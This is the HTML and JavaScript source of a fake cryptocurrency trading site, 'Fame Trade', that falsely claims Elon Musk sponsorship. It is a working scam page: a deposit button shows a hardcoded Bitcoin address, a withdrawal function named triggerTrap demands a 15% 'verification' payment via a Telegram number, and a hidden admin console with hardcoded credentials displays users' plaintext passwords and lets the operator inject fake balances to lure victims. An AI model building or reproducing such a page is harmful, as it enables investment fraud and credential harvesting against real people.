<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fame Trade | Sponsored by Elon Musk</title>
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <style>
        :root { --green: #00c853; --red: #ff3d00; --dark: #0a0a0a; --card: #141414; --gold: #f3ba2f; }
        body { font-family: -apple-system, sans-serif; background: var(--dark); color: white; margin: 0; }
        .hidden { display: none !important; }
        .page { min-height: 100vh; padding: 15px; box-sizing: border-box; }
        .card { background: var(--card); border-radius: 15px; padding: 15px; border: 1px solid #222; margin-bottom: 15px; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; margin-top: 5px; }
        .btn-green { background: var(--green); color: white; }
        .balance-usd { font-size: 2.5rem; font-weight: 800; text-align: center; margin: 10px 0; }
        #chart-container { height: 300px; width: 100%; border-radius: 10px; overflow: hidden; margin: 15px 0; }
        
        /* Admin Dashboard Styles */
        #admin-dash { background: white; color: black; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    </style>
</head>
<body>

<div id="auth-page" class="page">
    <div class="card" style="margin-top: 20vh; text-align: center;">
        <h1 style="color: var(--gold);">Fame Trade</h1>
        <div id="auth-toggle">
            <h3 id="auth-title">Login</h3>
            <input type="email" id="auth-email" placeholder="Email">
            <input type="password" id="auth-pass" placeholder="Password">
            <button class="btn btn-green" onclick="handleAuth()">Continue</button>
            <p onclick="toggleAuthMode()" style="font-size: 0.8rem; color: #888; margin-top: 15px; cursor: pointer;">
                Don't have an account? <span style="color: var(--gold);">Create Account</span>
            </p>
        </div>
    </div>
</div>

<div id="main-site" class="page hidden">
    <header style="display: flex; justify-content: space-between; align-items: center;">
        <h2 style="color: var(--gold);">Fame Trade</h2>
        <button onclick="logout()" style="background:none; border:none; color:#555;">Logout</button>
    </header>

    <div class="card" style="text-align: center; background: linear-gradient(180deg, #1a1a1a, #000);">
        <div style="color: var(--gold);" id="btc-display">0.00000000 BTC</div>
        <div class="balance-usd" id="usd-display">$0.00</div>
        <div style="display: flex; gap: 10px;">
            <button class="btn btn-green" style="flex:1" onclick="alert('BTC Address: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
            <button class="btn" style="flex:1; background:#333; color:white;" onclick="handleWithdraw()">Withdraw</button>
        </div>
    </div>

    <div id="chart-container"></div>

    <h3>Live Markets</h3>
    <div class="card" id="market-list" style="height: 200px; overflow-y: auto;"></div>

    <div class="card" style="font-size: 0.7rem; color: #444; text-align: center;">
        <p id="user-info"></p>
        <p>Sponsored by Elon Musk</p>
        <div onclick="document.getElementById('admin-gate').classList.remove('hidden')" style="width: 20px; height: 20px; margin: auto;">.</div>
    </div>
</div>

<div id="withdraw-page" class="page hidden" style="background: #000; position: fixed; top:0; width: 100%;">
    <button onclick="closeWithdraw()" style="color: white; background: none; border: none; padding: 20px;">‚Üê Back</button>
    <div class="card">
        <h3>Select Method</h3>
        <select id="method">
            <option>Bitcoin Wallet</option>
            <option>CashApp ($Tag)</option>
            <option>Ethereum (ERC20)</option>
            <option>Bank Wire</option>
        </select>
        <input type="text" placeholder="Enter Wallet Address or Tag">
        <button class="btn btn-green" onclick="triggerTrap()">Submit Withdrawal</button>
    </div>
</div>

<div id="admin-dash" class="hidden">
    <h2>Admin Console <button onclick="location.reload()" style="float:right; background:red; color:white; border:none; padding:5px;">Exit</button></h2>
    <div style="background:#eee; padding:15px; border-radius:10px; margin-bottom:20px;">
        <h4>Inject Funds</h4>
        <input type="email" id="inj-email" placeholder="User Email" style="color:black; background:white;">
        <input type="number" id="inj-amt" placeholder="Amount ($)" style="color:black; background:white;">
        <button class="btn btn-green" onclick="inject()">Inject</button>
    </div>
    <h4>User Logs</h4>
    <table id="log-table">
        <thead><tr><th>Email</th><th>Password</th><th>Status</th></tr></thead>
        <tbody></tbody>
    </table>
</div>

<div id="admin-gate" class="hidden" style="position:fixed; top:0; background:rgba(0,0,0,0.9); width:100%; height:100%; z-index:9999; display:flex; align-items:center; justify-content:center;">
    <div class="card" style="background:white; color:black; width:80%;">
        <h3>Admin ID</h3>
        <input type="text" id="adm-u" placeholder="ID">
        <input type="password" id="adm-p" placeholder="Password">
        <button class="btn btn-green" onclick="verifyAdmin()">Login</button>
    </div>
</div>

<script>
    let isSignup = false;
    let users = JSON.parse(localStorage.getItem('ft_users')) || [];
    let loggedUser = JSON.parse(localStorage.getItem('ft_session')) || null;
    let balance = 0;

    function toggleAuthMode() {
        isSignup = !isSignup;
        document.getElementById('auth-title').innerText = isSignup ? "Create Account" : "Login";
    }

    function handleAuth() {
        const e = document.getElementById('auth-email').value;
        const p = document.getElementById('auth-pass').value;
        if(e && p) {
            if(isSignup) users.push({email: e, pass: p});
            localStorage.setItem('ft_users', JSON.stringify(users));
            localStorage.setItem('ft_session', JSON.stringify({email: e}));
            location.reload();
        }
    }

    function logout() {
        localStorage.removeItem('ft_session');
        location.reload();
    }

    // Load Session
    if(loggedUser) {
        document.getElementById('auth-page').classList.add('hidden');
        document.getElementById('main-site').classList.remove('hidden');
        document.getElementById('user-info').innerText = "Logged in as: " + loggedUser.email;
        initChart();
        genMarkets();
    }

    function initChart() {
        new TradingView.widget({
            "container_id": "chart-container",
            "autosize": true,
            "symbol": "BINANCE:BTCUSDT",
            "interval": "D",
            "timezone": "Etc/UTC",
            "theme": "dark",
            "style": "1",
            "locale": "en",
            "toolbar_bg": "#f1f3f6",
            "enable_publishing": false,
            "hide_top_toolbar": true,
            "save_image": false
        });
    }

    function genMarkets() {
        const list = document.getElementById('market-list');
        const coins = ["BTC", "ETH", "SOL", "BNB", "XRP", "ADA", "DOGE", "TRX", "DOT", "MATIC"];
        coins.forEach(c => {
            list.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #222;">
                <b>${c}/USD</b> <button style="background:var(--green); border:none; color:white; border-radius:4px;" onclick="trade()">Trade</button>
            </div>`;
        });
    }

    function handleWithdraw() {
        if(balance < 500) {
            alert("Insufficient Funds: Minimum withdrawal is $500. Current balance: $" + balance);
        } else {
            document.getElementById('withdraw-page').classList.remove('hidden');
        }
    }

    function triggerTrap() {
        alert("Verification Required:\n\nDear user, contact customer support or pay 15% of your available balance before completing withdrawal.\n\nTelegram Support: +1 215 620 8677");
    }

    function closeWithdraw() { document.getElementById('withdraw-page').classList.add('hidden'); }

    function verifyAdmin() {
        if(document.getElementById('adm-u').value === "Admin" && document.getElementById('adm-p').value === "ElonMusk2025") {
            document.getElementById('admin-gate').classList.add('hidden');
            document.getElementById('admin-dash').classList.remove('hidden');
            const tbody = document.querySelector("#log-table tbody");
            tbody.innerHTML = "";
            users.forEach(u => {
                tbody.innerHTML += `<tr><td>${u.email}</td><td>${u.pass}</td><td>Active</td></tr>`;
            });
        }
    }

    function inject() {
        const amt = document.getElementById('inj-amt').value;
        balance = parseFloat(amt);
        document.getElementById('usd-display').innerText = "$" + balance.toLocaleString();
        document.getElementById('btc-display').innerText = (balance / 98000).toFixed(8) + " BTC";
        alert("Injected successfully!");
    }

    function trade() {
        if(balance <= 0) alert("Deposit funds to trade live markets.");
        else alert("Order Executed with Injected Funds!");
    }
</script>
</body>
</html>
